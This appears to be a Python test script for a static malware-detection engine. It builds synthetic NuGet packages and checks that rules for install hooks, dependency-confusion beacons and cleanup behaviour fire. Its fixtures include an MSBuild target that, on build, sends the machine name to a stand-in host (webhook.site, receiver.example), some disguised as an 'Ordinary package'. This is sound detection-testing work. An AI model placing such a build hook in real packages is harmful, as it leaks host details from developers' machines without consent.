#!/usr/bin/env python3
"""Static NuGet hook controls; package code is never built or executed."""

import argparse
import json
from pathlib import Path
import subprocess
import tempfile
import zipfile


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="../cleave/target/release/cleave")
    parser.add_argument("--samples-root", type=Path, action="append")
    args = parser.parse_args()
    repo = Path(__file__).resolve().parents[2]
    engine = str((repo / args.cleave).resolve())
    prefix = "objectives/supply-chain/install-hook/build/msbuild::"
    beacon = "objectives/supply-chain/impersonation/depconf::nuget-dependency-confusion-host-beacon"
    lead = "micro-behaviors/communications/http/download/package::msbuild-host-read-query-clues"
    rewrite = "objectives/evasion/indicator-removal/structure::nuget-build-hook-cleanup-api-clues"
    hook = "metadata/build/msbuild::msbuild-before-build-target"
    parameter = "metadata/build/msbuild::msbuild-task-given-project-directory"
    mythic = "third_party/elastic/Multi_Trojan_Mythic/multi/trojan/mythic"
    removal = "micro-behaviors/data/config/delete::dotnet-nuget-reference-removal-apis"
    cleanup = "micro-behaviors/fs/delete/file/library::dotnet-nuget-restore-cleanup-apis"
    delete = "micro-behaviors/fs/delete/file/library::dotnet-file-delete-call"
    nuspec = '''<package><metadata><id>Example</id><version>1.0.0</version>
<authors>Example</authors><description>{description}</description></metadata></package>'''
    target = '''<Project><Target Name="Callback" BeforeTargets="{trigger}">
<PropertyGroup><Device>$([System.Environment]::MachineName)</Device>
<Endpoint>https://webhook.site/example?host=$(Device)</Endpoint></PropertyGroup>
<DownloadFile SourceUrl="$(Endpoint)" DestinationFolder="/tmp" />
</Target></Project>'''
    cases = {}

    def package(work, name, description, source, required):
        path = work / name
        with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("Example.nuspec", nuspec.format(description=description))
            archive.writestr("build/Example.targets", source)
        cases[name] = set(required)

    with tempfile.TemporaryDirectory(prefix="nupkg-bad-controls-") as directory:
        work = Path(directory)
        for i, trigger in enumerate(["Build", "CoreCompile;Build", "ResolveAssemblyReferences;CoreCompile;Build",
                                     "CoreCompile", "ResolveAssemblyReferences"]):
            package(work, f"beacon-{i}.nupkg", "Dependency-confusion proof of concept",
                    target.format(trigger=trigger), {beacon, lead} | ({hook} if "Build" in trigger else set()))
        source = target.format(trigger="Build")
        package(work, "undisclosed.nupkg", "Ordinary package", source, {lead, hook})
        package(work, "renamed.nupkg", "Ordinary package",
                source.replace("Device", "MachineKey").replace("Endpoint", "Remote")
                .replace("webhook.site/example", "receiver.example/report"), {lead, hook})
        package(work, "opaque-query.nupkg", "Ordinary package",
                source.replace("?host=$(Device)", "?id=$(Device)"), {lead, hook})
        package(work, "commented-machine.nupkg", "Dependency-confusion proof of concept",
                source.replace("<Device>$([System.Environment]::MachineName)</Device>",
                               "<!-- <Device>$([System.Environment]::MachineName)</Device> -->"), {hook})
        package(work, "no-machine-read.nupkg", "Dependency-confusion proof of concept",
                source.replace("$([System.Environment]::MachineName)", "constant"), {hook})
        package(work, "no-transfer.nupkg", "Dependency-confusion proof of concept",
                source.replace('<DownloadFile SourceUrl="$(Endpoint)" DestinationFolder="/tmp" />', ""), {hook})
        package(work, "no-host-query.nupkg", "Dependency-confusion proof of concept",
                source.replace("?host=$(Device)", "?version=1"), {hook})
        package(work, "manual-target.nupkg", "Dependency-confusion proof of concept",
                source.replace(' BeforeTargets="Build"', ""), set())
        package(work, "comment-only.nupkg", "Dependency-confusion proof of concept",
                "<Project><!--" + source + "--></Project>", set())
        package(work, "inert-disclosure.nupkg", "Dependency-confusion proof of concept", "<Project />", set())
        for name, attrs in [("project-root.nupkg", 'ProjectDir="$(MSBuildProjectDirectory)"'),
                            ("project-root-spaces.nupkg", "ProjectDir = '$(MSBuildProjectDirectory)'"),
                            ("project-root-output.nupkg", 'ProjectDir="$(MSBuildProjectDirectory)" OutputPath="$(IntermediateOutputPath)"')]:
            package(work, name, "Code generator",
                    '<Project><UsingTask TaskName="Generate" AssemblyFile="$(GeneratorPath)" />'
                    '<Target BeforeTargets="Build"><Generate ' + attrs + ' /></Target></Project>', {hook, parameter})
        for name, trigger, required in [("target-list.xml", "Clean; Build ;Test", {hook}),
                                        ("target-spaces.xml", " Build ", {hook}),
                                        ("target-prefix.xml", "PreBuild", set()),
                                        ("target-suffix.xml", "BuildSomething", set())]:
            (work / name).write_text(target.format(trigger=trigger))
            cases[name] = required | ({lead} if required else set())
        for name, statement, required in [
            ("delete.cs", "File.Delete(path);", {delete}),
            ("delete-literal.cs", 'File.Delete("old.txt");', {delete}),
            ("delete-comment.cs", "// File.Delete(path);", set()),
        ]:
            (work / name).write_text("using System.IO; class Sample { void Run(string path) {\n" + statement + "\n} }")
            cases[name] = required

        # Check the real managed package code and near-miss binary mutations
        # only when the caller explicitly supplies the reviewed samples.
        if args.samples_root:
            packages = {p.name: p for root in args.samples_root for p in root.rglob("*.nupkg")}
            suspicious = packages["Systemm.Drawing.Common.1.0.4.nupkg"]
            with zipfile.ZipFile(suspicious) as archive:
                code = archive.read("tasks/Systemm.Drawing.Common.Tasks.dll")
            for name, payload, required in [
                ("restore-removal.dll", code, {removal, cleanup, delete}),
                ("renamed-family.dll", code.replace(b"Systemm.Drawing.Common", b"Example.Drawing.Common"), {removal, cleanup, delete}),
                ("missing-write-api.dll", code.replace(b"WriteAllText", b"QuietAllText"), {delete}),
            ]:
                (work / name).write_bytes(payload)
                cases[name] = required
            # Preserve the real package layout while independently removing
            # code mutation support or the implicit build activation surface.
            for name, change_code, manual, required in [
                ("real-build-hook.nupkg", False, False, {rewrite, removal, cleanup, delete, hook, parameter}),
                ("real-no-rewrite-api.nupkg", True, False, {delete, hook, parameter}),
                ("real-manual-cleanup.nupkg", False, True, {removal, cleanup, delete, parameter}),
            ]:
                with zipfile.ZipFile(suspicious) as source_archive, zipfile.ZipFile(work / name, "w") as output:
                    for member in source_archive.namelist():
                        data = source_archive.read(member)
                        if change_code and member.endswith("Tasks.dll"):
                            data = data.replace(b"WriteAllText", b"QuietAllText")
                        if manual and member.endswith(".targets"):
                            data = data.replace(b'BeforeTargets="Build"', b'BeforeTargets="Manual"')
                        output.writestr(member, data)
                cases[name] = required
            if "zyc.framework.modules.aspire.kms.1.1.4.nupkg" in packages:
                with zipfile.ZipFile(packages["zyc.framework.modules.aspire.kms.1.1.4.nupkg"]) as archive:
                    code = archive.read("lib/net10.0-windows7.0/ZYC.Framework.Modules.Aspire.KMS.dll")
                for name, extra, required in [
                    ("shared-dependencies.dll", b"", set()),
                    ("agent-import.dll", b"\x00Agent.Profiles.Http\x00", {mythic}),
                    ("athena-modules.dll", b"\x00Athena.Commands.dll\x00Athena.Handler.Linux.dll\x00", {mythic}),
                ]:
                    (work / name).write_bytes(code + extra)
                    cases[name] = required

        checked = {beacon, lead, rewrite, hook, parameter, mythic, removal, cleanup, delete}
        result = subprocess.run([engine, "--traits-dir", str(repo), "--format=json", str(work)],
                                capture_output=True, text=True, check=True)
        seen = set()
        for line in result.stdout.split("\n"):
            if not line:
                continue
            file = json.loads(line)["files"][0]
            name = Path(file["path"]).name
            if name not in cases:
                continue
            ids = {t["id"] for t in file.get("traits", [])}
            assert ids & checked == cases[name], (name, ids & checked, cases[name])
            seen.add(name)
        assert seen == cases.keys(), (seen, cases.keys())
    print(f"NuGet triage controls: {len(cases)} passed")


if __name__ == "__main__":
    main()
